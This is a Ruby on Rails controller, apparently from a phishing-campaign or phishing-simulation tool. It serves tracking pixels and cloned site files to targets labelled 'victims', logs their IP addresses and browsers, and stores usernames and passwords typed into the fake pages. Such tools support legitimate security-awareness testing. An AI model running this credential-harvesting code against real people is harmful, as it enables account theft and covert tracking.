class SiteDeliveryController < ApplicationController
  skip_before_filter :authenticate_admin!

  def get_victim
    @campaign = Campaign.find(params[:id])

    # Allow uid 000000 for testing the campaign
    if params[:uid] == '000000'
      v = Victim.new
    else
      v = @campaign.victims.find_by(uid: params[:uid])
    end

    v
  end

  def create_visit(victim, extra)
    visit = Visit.new
    visit.victim_id = victim.id
    visit.browser = request.env['HTTP_USER_AGENT']
    visit.ip_address = request.env['HTTP_X_FORWARDED_FOR'] || request.remote_ip
    visit.extra = extra

    if params[:PasswordForm]
      credential = visit.build_credential
      credential.username = params[:UsernameForm].to_s
      credential.password = params[:PasswordForm].to_s
    end

    visit.save unless victim.id == '000000'

    visit
  end

  def tracking_image
    victim = get_victim

    if victim
      create_visit(victim, 'SOURCE: EMAIL')
    else
      logger.info  "Tracking image request for unknown UID: #{params[:uid]}"
    end

    send_file File.join(Rails.root.to_s, 'public', 'tracking_pixel.png'), :type => 'image/png', :disposition => 'inline'
  end

  def view
    victim = get_victim

    if victim
      create_visit(victim, params[:extra])
    else
      logger.info "Unknown UID: #{params[:uid].inspect} - #{params[:filename].inspect}"
      # If someone is browsing to the root site, or the index page, give
      # them a 404 if we don't know who they are... We need to carry on
      # for other assets etc that may be required/included in the
      # page.
      if !params[:filename] || params[:filename].downcase.include?('index')
        raise ActiveRecord::RecordNotFound
      end
    end

    # TODO: If they have a valid UID but browsing to the root then display the
    # index page.
    if victim && (!params.has_key?(:filename) || params[:filename].blank?)
      unless params[:uid]
        raise ActiveRecord::RecordNotFound
      end
      render text: "TODO: render default index file!"
      return
    end

    # Otherwise serve up the website file...
    @campaign.template.website_files.each do |attachment|
      if attachment.file_identifier.downcase == params[:filename].downcase
        begin
          f = File.read(attachment.file.current_path)

          # TODO: Document that this replacement takes place
          # but only for HTTP content types... Javascript may also be
          # wanted?
          f.gsub!('<%= UID %>', params[:uid])
          content_type = attachment.file.content_type
          if content_type.include?('http')
            render text: f
          else
            send_data f, type: content_type, disposition: 'inline'
          end
        rescue Exception => e
          render text: "500 Server Error", status: 500
          logger.error e
        ensure
          return
        end
      end
    end

    raise ActiveRecord::RecordNotFound
  end

end
